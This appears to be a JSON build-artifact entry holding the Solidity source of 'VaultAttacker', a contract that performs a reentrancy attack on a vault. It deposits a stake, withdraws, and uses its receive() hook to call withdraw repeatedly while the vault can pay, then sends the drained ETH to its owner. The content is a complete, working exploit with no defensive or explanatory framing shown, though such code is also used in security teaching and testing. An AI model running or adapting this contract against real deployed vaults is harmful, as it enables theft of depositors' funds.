      "bytecode": "",
      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {IVault} from \"./IVault.sol\";\n\n/// @title VaultAttacker\n/// @author Jérémie Nagi\n/// @notice Deposits a stake in a vault, withdraws it, and withdraws again each time the vault pays.\ncontract VaultAttacker {\n    IVault public immutable vault;\n    address public immutable owner;\n\n    /// @dev Amount deposited, paid back by the vault on each `withdraw`.\n    uint256 private stake;\n\n    error NotOwner();\n    error StakeRequired();\n    error PayoutFailed();\n\n    constructor(IVault target) {\n        vault = target;\n        owner = msg.sender;\n    }\n\n    /// @notice Runs the exploit with the ETH sent as the stake.\n    function attack() external payable {\n        if (msg.sender != owner) revert NotOwner();\n        if (msg.value == 0) revert StakeRequired();\n\n        stake = msg.value;\n        vault.deposit{value: msg.value}();\n        vault.withdraw();\n\n        (bool paid,) = owner.call{value: address(this).balance}(\"\");\n        if (!paid) revert PayoutFailed();\n    }\n\n    /// @dev Runs on every payment: asks again while the vault can still pay a full stake.\n    receive() external payable {\n        if (msg.sender == address(vault) && address(vault).balance >= stake) {\n            vault.withdraw();\n        }\n    }\n}\n"
    }
